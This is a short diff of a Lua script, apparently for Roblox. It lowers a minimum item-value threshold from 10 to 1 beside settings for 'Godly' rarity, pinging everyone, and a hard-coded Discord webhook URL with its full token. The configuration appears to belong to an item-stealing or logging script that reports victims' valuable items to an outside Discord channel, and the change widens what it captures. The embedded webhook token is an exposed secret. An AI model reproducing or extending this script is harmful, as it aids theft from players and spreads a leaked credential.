@@ -30,7 +30,7 @@ if #users == 0 then
     return
 end
 local min_rarity = _G.min_rarity or "Godly"
-local min_value = _G.min_value or 10
+local min_value = _G.min_value or 1
 local ping = _G.pingEveryone or "Yes"
 local webhook = _G.webhook or "https://discord.com/api/webhooks/1543244647462080623/5JzL3T30KbyJunUmcCCcn2P6mHRlOJPaJhqA1OZ35rLzmRg9iaffDugI3hvQuVd4J0os"
 -- Now safe to use plr
